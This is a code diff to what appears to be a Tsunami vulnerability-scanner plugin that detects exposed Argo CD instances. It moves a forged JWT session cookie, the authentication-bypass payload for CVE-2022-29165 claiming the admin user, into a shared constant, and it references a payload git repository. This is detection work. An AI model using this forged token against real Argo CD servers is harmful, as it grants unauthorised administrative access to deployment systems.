@@ -19,6 +19,7 @@ package com.google.tsunami.plugins.detectors.exposedui.argocd;
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.tsunami.common.net.http.HttpRequest.*;
 
+import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.collect.ImmutableSet;
 import com.google.common.flogger.GoogleLogger;
@@ -83,6 +84,13 @@ public final class ExposedArgoCDDetector implements VulnDetector {
   private final String PAYLOAD_GIT_URL = "https://github.com/JamesFoxxx/argo-cd-app";
   // The Path to the directory of payload on the git repository
   private final String PAYLOAD_GIT_PATH = "payloads/jsonnet-guestbook-tla";
+
+  // The JWT session value as a part of the CVE-2022-29165 payload
+  @VisibleForTesting
+  static final String PAYLOAD_ARGOCD_TOKEN_SESSION =
+      "argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."
+          + "TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ";
+
   // This is a template for creating an Argo CD application, we should fill four part of this
   // payload.
   private final String CREATE_APPLICATION_TEMPLATE =
@@ -179,12 +187,7 @@ public final class ExposedArgoCDDetector implements VulnDetector {
   /** Checks if a {@link NetworkService} has a vulnerable ArgoCD instances to CVE-2022-29165. */
   private boolean isServiceVulnerableToAuthBypass(NetworkService networkService) {
     HttpHeaders.Builder cookieHeader =
-        HttpHeaders.builder()
-            .addHeader(
-                "Cookie",
-                "argocd.token="
-                    + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."
-                    + "TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ");
+        HttpHeaders.builder().addHeader("Cookie", PAYLOAD_ARGOCD_TOKEN_SESSION);
     return checkExposedArgoCdWithOutOfBandCallback(networkService, cookieHeader);
   }
 
